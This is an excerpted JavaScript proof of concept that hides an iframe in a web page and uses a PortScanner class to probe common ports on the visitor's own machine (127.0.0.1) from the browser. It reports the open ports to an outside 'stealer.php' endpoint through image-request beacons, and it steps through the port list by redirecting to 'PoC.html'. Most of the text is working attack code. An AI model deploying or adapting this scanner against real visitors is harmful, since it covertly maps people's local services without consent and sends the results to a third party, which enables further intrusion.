document.write('<iframe class="iframe_webrtc" sandbox="allow-same-origin" style="display: none"></iframe>');
...
class PortScanner {
 ...
 getCommonHttpPorts() {
    return [443,80,81,66,445,457,1080,1100,1241,1352,1337,1433,1434,1521,1944,2301,3000,3128,3306,4000,4001,4002,4100,5000,5432,5800,5801,5802,6346,6347,7001,7002,8000,8080,8888,30821].filter(x=>!~this.restrictedPorts[this.browser].indexOf(x));
  }
  getCommonPorts() {
  ...
  complete() {
    if(this.openPorts.length) {
      ...
      send_message("open", this.openPorts)
  ...
  async scanChromeWindows() {
    send_message("SCANNING", "WINDWOWSCHROME");
    var that = this;
...
function send_message(one, two){
  img.src = website + '/stealer.php/?open=' + one + '&port=' + two;
}

(async () =>{
  const url_params = new URLSearchParams(window.location.search);
    
  var now = parseInt(url_params.get('i'));
  var scan = new PortScanner(), ip, ips, i;
  ip = "127.0.0.1";
  scan.setUrl('http://127.0.0.1');

  await scan.scanPort(scan.getCommonHttpPorts()[now]);
  now++;
  if(now <= scan.getCommonHttpPorts().length){
   window.location.replace(website + "PoC.html?i=" + now);
   return;
  }
  send_message("||||||||||||||||||||", "||||||||||||||||||||");
})();
